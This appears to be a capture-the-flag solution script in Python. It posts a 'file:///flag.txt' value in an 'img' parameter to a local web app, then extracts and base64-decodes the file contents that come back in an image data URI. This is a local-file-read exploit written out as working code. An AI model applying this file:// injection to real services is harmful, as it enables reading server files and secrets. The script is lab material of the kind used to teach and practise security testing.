# docker run -it -e URL=http://localhost:3000/ --network=host $(docker build -q ./solution)
import requests
import os
import re
import base64

URL = os.getenv("URL", "http://localhost:3000/")


r = requests.post(f"{URL}", params={
    "img": "file:///flag.txt"
})
encoded = re.findall(r'<img src="data:text/plain;base64,(.+)" alt="file:///flag.txt" />', r.text)[0]
flag = base64.b64decode(encoded.encode()).decode()
print(flag)


    
